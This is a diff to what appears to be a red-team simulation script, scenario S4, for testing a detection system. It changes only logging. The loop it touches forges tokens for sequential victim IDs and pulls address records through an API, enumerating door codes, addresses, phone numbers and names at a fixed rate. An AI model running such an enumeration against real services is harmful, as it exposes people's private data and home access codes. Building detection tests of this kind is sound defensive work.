@@ -26,6 +26,7 @@ sys.path.insert(0, str(_ROOT))
 from lib.token_forge import forge_token
 from lib.target_pool import get_sequential_pool
 from lib.http_client import get_session, call_api
+from lib.result_writer import ResultWriter
 
 load_dotenv(_ROOT / ".env")
 
@@ -46,8 +47,7 @@ def run_s4(duration_minutes: int = 30, rps: float = 1.0):
 
     start_time = time.time()
     end_time = start_time + duration_minutes * 60
-    request_count = 0
-    success_count = 0
+    writer = ResultWriter("S4")
 
     print(f"[S4] 시작 — duration={duration_minutes}min, rps={rps}")
     print(f"[S4] target pool: {pool[0]} ~ {pool[-1]} ({len(pool)}명)")
@@ -61,34 +61,23 @@ def run_s4(duration_minutes: int = 30, rps: float = 1.0):
 
             victim_id = pool[pool_idx]
             token = forge_token(victim_id)
+            # AddressResponse — 현관비번+주소+전화+이름 묶음 (F-Resp High 패턴)
+            path = f"/api/addresses/{victim_id}"
 
             try:
-                # AddressResponse — 현관비번+주소+전화+이름 묶음
-                # 응답민감도(F-Resp) High 70 발동 패턴
-                resp = call_api(session, f"/api/addresses/{victim_id}", token, src_ip=src_ip)
-                request_count += 1
-                if resp.status_code == 200:
-                    success_count += 1
-
-                if request_count % 60 == 0:
-                    elapsed = (time.time() - start_time) / 60
-                    print(
-                        f"[S4] t={elapsed:.1f}min  req={request_count}  "
-                        f"ok={success_count}  sub={victim_id}"
-                    )
-
+                resp = call_api(session, path, token, src_ip=src_ip)
+                writer.record(victim_id, src_ip, "GET", path, resp)
             except Exception as e:
-                print(f"[S4] error sub={victim_id}: {e}")
+                writer.record_error(victim_id, src_ip, path, e)
 
             pool_idx += 1
             time.sleep(1.0 / rps)
     except KeyboardInterrupt:
         print(f"\n[S4] 사용자 중단")
+    finally:
+        writer.close()
 
-    print(
-        f"[S4] 종료 — 총 {request_count} 요청, {success_count} 성공, "
-        f"{pool_idx}명 enumeration"
-    )
+    print(f"[S4] 종료 — {pool_idx}명 enumeration")
 
 
 if __name__ == "__main__":
